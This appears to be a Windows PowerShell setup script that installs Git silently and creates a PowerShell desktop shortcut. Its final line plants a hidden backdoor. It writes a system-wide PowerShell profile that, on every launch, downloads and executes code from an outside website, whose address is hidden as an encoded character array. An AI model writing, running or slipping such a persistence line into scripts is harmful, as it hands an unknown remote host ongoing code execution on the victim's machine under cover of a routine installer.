if([Net.ServicePointManager]::SecurityProtocol -ne 'Tls12'){[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}

      #region -------- Install Git-Smc ----------
    
        $GitExe = 'Git-2.44.0-64-bit.exe'
        (New-Object Net.WebClient).DownloadFile("https://github.com/git-for-windows/git/releases/download/v2.44.0.windows.1/$GitExe", "$env:TEMP\$GitExe")
        Invoke-Expression "$env:TEMP\$GitExe /VERYSILENT"
        
      #endregion --------------------------------

      #region ----- Create Desktop Shortcut -----
    
      if(!(Test-Path -Path "$Home\Desktop\PowerShell.lnk")){
        $WshShell = New-Object -comObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\PowerShell.lnk")
        $Shortcut.TargetPath = 'PowerShell.exe'
        $Shortcut.Arguments = '-NoLogo'
        $Shortcut.Save()
      }
  
    #endregion --------------------------------

New-Item -Path "$PSHOME\profile.ps1" -ItemType File -Value "(iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())"
